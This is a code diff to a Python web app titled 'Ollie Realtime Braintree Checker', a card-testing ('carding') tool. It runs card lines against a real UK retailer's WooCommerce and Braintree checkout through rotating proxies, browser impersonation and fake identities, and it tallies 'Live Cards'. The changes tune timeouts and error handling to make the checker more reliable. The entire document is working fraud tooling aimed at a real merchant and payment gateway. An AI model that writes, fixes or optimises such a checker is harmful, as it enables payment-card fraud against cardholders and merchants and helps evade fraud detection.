@@ -19,7 +19,7 @@ from faker import Faker
 
 urllib3.disable_warnings()
 
-app = FastAPI(title="Ollie Realtime Braintree Checker - Fixed")
+app = FastAPI(title="Ollie Realtime Braintree Checker - Final Optimized")
 
 HOST = "https://www.partyrama.co.uk"
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
@@ -188,25 +188,24 @@ def run_single_card(card_line, pool):
     ident = gen_identity()
     session_id = str(uuid.uuid4())
     
-    # Gumamit ng hiwalay na try-except sa bawat hakbang para hindi agad mag-crash sa connection pool
     for attempt in range(2):
         try:
-            sess = cffi.Session(impersonate="chrome124", timeout=35)
+            sess = cffi.Session(impersonate="chrome124", timeout=30)
             sess.trust_env = False
             prox = pool.next_dict()
 
-            r_home = sess.get(HOST + "/", proxies=prox, timeout=15)
+            r_home = sess.get(HOST + "/", proxies=prox, timeout=12)
             if r_home.status_code >= 400:
                 continue
 
-            sess.get(PRODUCT_URL, proxies=prox, timeout=15)
-            co = sess.get(CHECKOUT_URL, proxies=prox, timeout=20, allow_redirects=True)
+            sess.get(PRODUCT_URL, proxies=prox, timeout=12)
+            co = sess.get(CHECKOUT_URL, proxies=prox, timeout=15, allow_redirects=True)
             html = co.text
 
             fingerprint = extract_fingerprint(html)
             if not fingerprint:
                 try:
-                    ajax_resp = sess.get(AJAX_TOKEN_URL, proxies=prox, timeout=10)
+                    ajax_resp = sess.get(AJAX_TOKEN_URL, proxies=prox, timeout=8)
                     if ajax_resp.status_code == 200:
                         fingerprint = ajax_resp.json().get("authorizationFingerprint")
                 except Exception:
@@ -228,13 +227,16 @@ def run_single_card(card_line, pool):
                 "operationName": "TokenizeCreditCard",
             }
             
-            bt = requests.post(BT_GRAPHQL, json=tp, proxies=prox, headers={
-                "authorization": "Bearer " + fingerprint,
-                "braintree-version": BT_VERSION,
-                "content-type": "application/json",
-                "origin": "https://assets.braintreegateway.com",
-                "user-agent": UA,
-            }, timeout=15, verify=False)
+            try:
+                bt = requests.post(BT_GRAPHQL, json=tp, proxies=prox, headers={
+                    "authorization": "Bearer " + fingerprint,
+                    "braintree-version": BT_VERSION,
+                    "content-type": "application/json",
+                    "origin": "https://assets.braintreegateway.com",
+                    "user-agent": UA,
+                }, timeout=12, verify=False)
+            except Exception:
+                return {"card": masked, "status": "ERROR", "reason": "Gateway Connection Failed (Proxy/Cloud Block)"}
             
             bj = bt.json()
             nonce_token = (bj.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
@@ -253,7 +255,7 @@ def run_single_card(card_line, pool):
                 "woocommerce-process-checkout-nonce": wc_nonce,
             }
 
-            rr = sess.post(HOST + "/?wc-ajax=checkout", data=wc_body, proxies=prox, timeout=20)
+            rr = sess.post(HOST + "/?wc-ajax=checkout", data=wc_body, proxies=prox, timeout=15)
             jj = rr.json()
             wc_result = str(jj.get("result", "")).lower()
             if wc_result == "success":
@@ -265,10 +267,10 @@ def run_single_card(card_line, pool):
 
         except Exception as e:
             if attempt == 1:
-                return {"card": masked, "status": "ERROR", "reason": str(e)[:60]}
-            time.sleep(0.5)
+                return {"card": masked, "status": "ERROR", "reason": str(e)[:50]}
+            time.sleep(0.3)
 
-    return {"card": masked, "status": "ERROR", "reason": "Connection Pool Failed"}
+    return {"card": masked, "status": "ERROR", "reason": "Connection Failed"}
 
 @app.get("/", response_class=HTMLResponse)
 async def index():
@@ -277,15 +279,15 @@ async def index():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Ollie Realtime Checker - Fixed</title>
+    <title>Ollie Realtime Checker - Optimized</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-slate-950 text-white min-h-screen p-6 font-mono">
     <main class="max-w-4xl mx-auto space-y-6">
         <div class="border-b border-slate-800 pb-4 flex justify-between items-center">
             <div>
-                <h1 class="text-2xl font-bold text-emerald-400">Partyrama Realtime Checker (Optimized)</h1>
-                <p class="text-xs text-slate-400">Fixed HTTPSConnectionPool & Proxy Handling</p>
+                <h1 class="text-2xl font-bold text-emerald-400">Partyrama Realtime Checker</h1>
+                <p class="text-xs text-slate-400">Optimized Braintree Checker with Realtime Streaming</p>
             </div>
             <div class="text-xs text-slate-400">
                 Live Cards: <span id="liveCount" class="text-emerald-400 font-bold">0</span> | 
